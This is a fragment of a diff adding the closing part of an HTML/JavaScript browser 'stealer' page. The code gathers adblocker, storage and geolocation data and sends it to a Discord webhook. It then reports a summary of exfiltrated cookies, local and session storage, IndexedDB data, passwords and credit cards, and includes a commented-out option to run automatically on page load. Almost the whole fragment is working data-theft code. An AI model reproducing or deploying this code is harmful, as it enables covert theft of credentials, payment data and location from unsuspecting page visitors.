+            addLog('[12/14] Detecting adblockers...', 'info');
+            const blockers = checkAdBlockers();
+            if (blockers.length > 0) {
+                await sendToDiscord(`**AdBlockers Detected:**\n${blockers.map(b => `• ${b}`).join('\n')}`, 0x8888ff, "AdBlockers");
+                addLog(`[✓] ${blockers.length} adblockers detected`, 'success');
+            } else {
+                addLog('[-] No adblockers detected', 'info');
+            }
+
+            // --- 13. Storage Quota ---
+            addLog('[13/14] Getting storage quota...', 'info');
+            try {
+                const quota = await getStorageQuota();
+                if (quota.quota && quota.quota > 0) {
+                    let quotaMsg = "**Storage Quota:**\n";
+                    quotaMsg += `• Used: ${(quota.usage / 1024 / 1024).toFixed(2)} MB\n`;
+                    quotaMsg += `• Total: ${(quota.quota / 1024 / 1024).toFixed(2)} MB\n`;
+                    quotaMsg += `• Used: ${quota.percentage}%`;
+                    await sendToDiscord(quotaMsg, 0x00ddff, "Storage Quota");
+                    addLog('[✓] Storage quota collected', 'success');
+                }
+            } catch(e) {
+                addLog('[-] Storage quota unavailable', 'info');
+            }
+
+            // --- 14. Geolocation ---
+            addLog('[14/14] Attempting geolocation...', 'info');
+            try {
+                const geo = await getGeolocation();
+                if (geo) {
+                    let geoMsg = `**Geolocation:**\n`;
+                    geoMsg += `• Latitude: ${geo.latitude}\n`;
+                    geoMsg += `• Longitude: ${geo.longitude}\n`;
+                    geoMsg += `• Accuracy: ${geo.accuracy} meters`;
+                    await sendToDiscord(geoMsg, 0x44ff88, "Geolocation");
+                    addLog('[✓] Geolocation captured', 'success');
+                } else {
+                    addLog('[-] Geolocation denied or unavailable', 'info');
+                }
+            } catch(e) {
+                addLog('[-] Geolocation failed', 'error');
+            }
+
+            // --- Update stats ---
+            const totalSensitive = Object.keys(sensitiveLocal).length + 
+                                  Object.keys(sensitiveSession).length + 
+                                  Object.keys(sensitiveContent).length;
+            updateStats(cookieCount, localCount + sessionCount, totalSensitive);
+
+            // --- Final summary ---
+            const summary = 
+                `✅ **EXFILTRATION COMPLETE**\n\n` +
+                `**Summary:**\n` +
+                `• Cookies: ${cookieCount}\n` +
+                `• Local Storage: ${localCount}\n` +
+                `• Session Storage: ${sessionCount}\n` +
+                `• IndexedDB: ${idbData?.length || 0} databases\n` +
+                `• Passwords: ${passwords.length}\n` +
+                `• Credit Cards: ${cards.length}\n` +
+                `• Sensitive Items: ${totalSensitive}\n` +
+                `• Extensions: ${extensions.length}\n` +
+                `• AdBlockers: ${blockers.length}\n` +
+                `• Geo Location: ${geo ? '✅ Captured' : '❌ Unavailable'}\n\n` +
+                `All data has been exfiltrated to Discord.`;
+            
+            await sendToDiscord(summary, 0x00ff00, "✅ COMPLETE");
+            addLog('✅ EXFILTRATION COMPLETE - All data sent to Discord', 'success');
+            
+            // Show success animation
+            document.querySelector('.container').style.borderColor = '#00ff88';
+            document.querySelector('.container').style.boxShadow = '0 0 60px rgba(0, 255, 136, 0.3)';
+            
+        } catch(e) {
+            addLog(`❌ ERROR: ${e.message}`, 'error');
+            await sendToDiscord(`❌ **ERROR:** ${e.message}`, 0xff0000, "Error");
+        } finally {
+            stealBtn.disabled = false;
+            stealBtn.textContent = '▶ EXFILTRATE ALL DATA';
+        }
+    }
+
+    // ===== EVENT LISTENERS =====
+    stealBtn.addEventListener('click', exfiltrateAll);
+
+    // ===== AUTO-RUN OPTION =====
+    // Uncomment line below to auto-run on page load
+    // setTimeout(exfiltrateAll, 1000);
+
+    addLog('[●] Stealer ready - click button to exfiltrate', 'info');
+    addLog('[●] Target Webhook: ' + WEBHOOK_URL.substring(0, 50) + '...', 'info');
+    addLog('[●] ' + navigator.userAgent.substring(0, 100) + '...', 'info');
+
 </script>
+
 </body>
 </html>
